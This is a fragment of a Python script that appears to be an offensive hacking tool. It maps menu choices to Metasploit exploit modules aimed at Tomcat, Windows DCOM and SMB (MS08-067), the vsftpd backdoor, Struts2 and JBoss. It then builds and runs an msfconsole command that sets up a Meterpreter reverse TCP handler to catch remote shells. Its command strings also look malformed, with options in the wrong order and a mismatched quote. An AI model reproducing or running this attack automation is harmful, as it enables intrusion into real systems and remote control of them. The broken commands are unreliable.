      ...
      try:
        while True:
           ...
           if choice == '1':
              ...
              exploits = {
                "11": "exploit/multi/http/tomcat_mgr_upload run set RPORT 4444",  
                "22": "exploit/windows/dcerpc/ms03_026_dcom run set RPORT 4444",  
                "33": "exploit/windows/smb/ms08_067_netapi run set RPORT 4444 ",  
                "44": "exploit/unix/ftp/vsftpd_234_backdoor run set RPORT 4444 ",  
                "55": "exploit/multi/http/struts2_code_exec run set RPORT 4444 ",  
                "66": "exploit/multi/http/jboss_deployment_scanner run set RPORT 4444", 
              }  
              ...
              if exploit_choice in exploits:
                command = f"msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {ip}; set lport 4444; exploit -j {exploits[exploit_choice]}'"
                print(Fore.BLUE + f"Running {command}...")
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = process.communicate()
                if stderr:
